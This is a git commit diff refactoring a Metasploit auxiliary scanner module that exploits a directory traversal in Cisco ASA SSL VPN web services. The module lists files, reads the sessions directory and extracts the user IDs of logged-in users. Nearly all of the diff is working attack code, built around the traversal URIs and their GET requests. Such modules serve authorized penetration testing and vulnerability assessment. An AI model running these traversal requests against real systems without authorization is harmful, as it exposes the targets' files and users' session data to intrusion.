0264eb2ea3725cfcc8cb8af2dfa74df6e7007260
Shelby Pace <shelby_pace@rapid7.com>
2018-08-01 09:51:45 -0500

    cleaned up module

--- modules/auxiliary/scanner/http/cisco_directory_traversal.rb
+++ modules/auxiliary/scanner/http/cisco_directory_traversal.rb
@@ -45,63 +45,64 @@ class MetasploitModule < Msf::Auxiliary
     return (res && res.body.include?("SSL VPN Service"))
   end
 
-  def get_files
-    file_uri = normalize_uri(target_uri.path, '/+CSCOU+/../+CSCOE+/files/file_list.json?path=/')
-    sessions_uri = normalize_uri(target_uri.path, '/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/')
-    cscoe_uri = normalize_uri(target_uri.path, '/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b')
+  def list_files(path)
+    uri = normalize_uri(target_uri.path, path)
 
-    file_res = send_request_cgi(
+    list_res = send_request_cgi(
       'method'  =>  'GET',
-      'uri'     =>  file_uri
+      'uri'     =>  uri
     )
 
-    sessions_res = send_request_cgi(
-      'method'  =>  'GET',
-      'uri'     =>  sessions_uri
-    )
-
-    cscoe_res = send_request_cgi(
-      'method'  =>  'GET',
-      'uri'     =>  cscoe_uri
-    )
-
-    if file_res
-      print_good(file_res.body)
-    end
-
-    if sessions_res
-      print_good(sessions_res.body)
-      session_no = sessions_res.body.match('([0-9]{2,})')
-
-      fail_with(Failure::BadConfig, 'Could not grab a session') if session_no.nil?
-      this_res = send_request_cgi('method' =>  'GET',  'uri' =>  normalize_uri(target_uri.path, sessions_uri, session_no))
-
-      if this_res && this_res.body.include?('name')
-        print_good(this_res.body)
-        user_ids = this_res.body.scan(/user:(\w+)/)
-        print_good(user_ids)
-
-        user_ids.each do |id|
-          id_res = send_request_cgi('method'  =>  'GET', 'uri'  => normalize_uri(target_uri.path, '/+CSCOU+/../+CSCOE+/', 'app_index.html'))
-          if id_res
-            print_good(id_res.body)
-          end
-        end
+    if list_res && list_res.code == 200
+      if list_res.body.match(/\/{3}sessions/)
+        list_users(list_res.body)
+      else
+        print_good(list_res.body)
       end
     end
+  end
 
-    if cscoe_res
-      print_good(cscoe_res.body)
+  def list_users(response)
+    sessions_uri = '/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/'
+    session_no = response.match(/([0-9]{2,})/)
+
+    unless !session_no.nil?
+      print_status("Could not detect any sessions")
+      print("\n")
+      return
+    end
+
+    users_res = send_request_cgi(
+      'method'  =>  'GET',
+      'uri'     =>  normalize_uri(target_uri.path, sessions_uri, session_no)
+    )
+
+    if users_res && users_res.body.include?('name')
+      user_ids = users_res.body.scan(/user:(\w+)/).flatten
+
+      unless user_ids.empty?
+        print_good(response)
+        print_status('Users logged in:')
+        user_ids.each { |id| print_good(id) }
+        print("\n")
+        return
+      end
+
+      print_status("There are no users logged in currently")
     end
   end
 
   def run
+    file_uri = '/+CSCOU+/../+CSCOE+/files/file_list.json?path=/'
+    sessions_uri = '/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/'
+    cscoe_uri = '/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b'
+
+    paths = [file_uri, sessions_uri, cscoe_uri]
+
     unless is_accessible?
       fail_with(Failure::NotFound, 'Failed to reach Cisco web logon service')
     end
 
-    get_files
+    paths.each { |path| list_files(path) }
   end
-
 end
-
